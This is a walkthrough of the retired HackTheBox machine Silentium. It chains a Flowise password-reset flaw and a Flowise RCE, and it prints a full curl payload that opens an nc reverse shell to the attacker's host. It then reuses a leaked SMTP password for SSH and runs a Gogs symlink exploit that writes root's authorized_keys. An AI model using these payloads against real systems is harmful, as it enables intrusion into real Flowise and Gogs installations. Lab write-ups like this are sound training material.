---
title: Writeup HTB - Silentium
description: >-
  A walkthrough of the retired HackTheBox machine Silentium: enumerating a
  staging Flowise instance, chaining two CVEs for a foothold, and abusing a
  vulnerable Gogs instance to escalate to root.
heroImage: silentium.png
pubDate: 2026-10-20T22:00:00.000Z
tags:
  - HackTheBox
  - Linux
seo_keywords: >-
  HackTheBox, Silentium, Writeup, CTF, Capture the Flag, Linux, Enumeration, Privilege Escalation
---

Silentium is a retired, easy-rated HackTheBox machine. It's a Linux box that comes down to careful enumeration followed by privilege escalation to reach root. In this writeup I'll walk through each step taken to compromise the machine and grab the root flag.

## Enumeration

An initial port scan shows that only ports 22 (SSH) and 80 (HTTP) are open:

```bash
└─$ nmap 10.129.245.103
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

A `curl` request to port 80 redirects to `silentium.htb`, so I added that hostname to `/etc/hosts` on my Kali machine.

## Main website

The main website at `silentium.htb` doesn't contain anything out of the ordinary. It does, however, mention three employees: Marcus, Ben and Elena — worth noting those names for later.

A directory scan turns up nothing interesting, but a subdomain scan reveals an application hosted at `staging.silentium.htb`:

```bash
└─$ ffuf -u http://silentium.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -H "Host: FUZZ.silentium.htb" -fc 301

staging [Status: 200, Size: 3142, Words: 789, Lines: 70, Duration: 36ms]
```

## Flowise

The application on `staging.silentium.htb` is Flowise, and this version is vulnerable to [CVE-2025-58434](https://github.com/advisories/GHSA-wgpv-6j63-x5ph).

Sending a **forgot password** request for a valid username returns the **tempToken** in the response. Using the names found on the public site, I confirmed that `ben@silentium.htb` was an existing user, reset his password, and logged in to Flowise.

![Flowise password reset](flowise.png)

![Flowise password reset token](flowise-token.png)

Flowise reports version `3.0.5`, which is affected by a critical RCE vulnerability: [CVE-2025-59528](https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-3gcm-f6qx-ff7p).

To exploit it, I first created an API key through the web interface, then sent a crafted POST request that spawns a reverse shell:

```bash
curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer yg4UFPCeWff8bsqJ49hjAWniCiLotfc2Pgjf77nhxJI" \
  -d '{
    "loadMethod": "listActions",
    "inputs": {
      "mcpServerConfig": "({x:(function(){const cp = process.mainModule.require(\"child_process\");cp.execSync(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.15.3 4444 >/tmp/f\");return 1;})()})"
    }
  }'
```

![cve-2025-59528](cve-2025-59528.png)

## Docker

Flowise is running inside a container — the presence of the `/.dockerenv` file gives it away.

Running `export` reveals some interesting environment variables:

```bash
~/.flowise export
...
export SENDER_EMAIL='ben@silentium.htb'
export SMTP_HOST='mailhog'
export SMTP_PASSWORD='r04D!!_R4ge'
...
```

Ben reuses the SMTP password for his user account, so it works for SSH as well:

```bash
└─$ ssh ben@silentium.htb
ben@silentium.htb's password:
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-107-generic x86_64)

ben@silentium:~$ ls -l
total 4
-rw-r----- 1 root ben 33 Oct  9 15:06 user.txt
```

## Privilege Escalation

Running `netstat -tulpn` shows a Gogs instance listening on port `3001`, bound to `127.0.0.1`. To reach it, I set up a tunnel with [ligolo-ng](https://github.com/nicocha30/ligolo-ng).

The Gogs binary lives at `/opt/gogs/gogs`. Running it with the `-v` flag shows version `0.13.3`, which is vulnerable to [CVE-2025-8110](https://github.com/popyue/CVE-2025-8110):

```bash
ben@silentium:/opt/gogs/gogs$ ./gogs -v
Gogs version 0.13.3
```

> CVE-2025-8110 is a critical vulnerability in Gogs (a self-hosted Git service) in versions &lt;= 0.13.3. The PutContents API validates file paths against directory traversal (`../`) but does not resolve symbolic links before writing. An authenticated user can push a commit containing a symlink that targets any file on the server, then call PutContents on that symlink to overwrite the real file with attacker-controlled content.

Registration is open, so I first created my own Gogs account. Then I generated an SSH key and used the exploit to add it to the root user's `authorized_keys`:

```bash
└─$ python3 exploit.py http://240.0.0.1:3001 -u coco -p Powned1! --rce-keys key

════════════════════════════════════════════════════════════
EXPLOIT SUMMARY
════════════════════════════════════════════════════════════
      Target: http://240.0.0.1:3001
      Username: coco
      Repository: coco/r_g62hrc

      ✓ vuln_check:
      ✓ login: coco
      ✓ create_repo: r_g62hrc
      ✓ push_symlink: lnk_2721mp -> /root/.ssh/authorized_keys
      ✓ file_write: 411 bytes
      ✗ rce: /root/.ssh/authorized_keys

  [+] EXPLOIT COMPLETED SUCCESSFULLY
```

With the key in place, I logged in as root over SSH:

```bash
└─$ ssh root@silentium.htb -i key
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-107-generic x86_64)

root@silentium:~# ls
gogs-repositories  root.txt
```

## Lessons learned

- Keep your software up to date.
- Don't expose internal tools through a public web server.
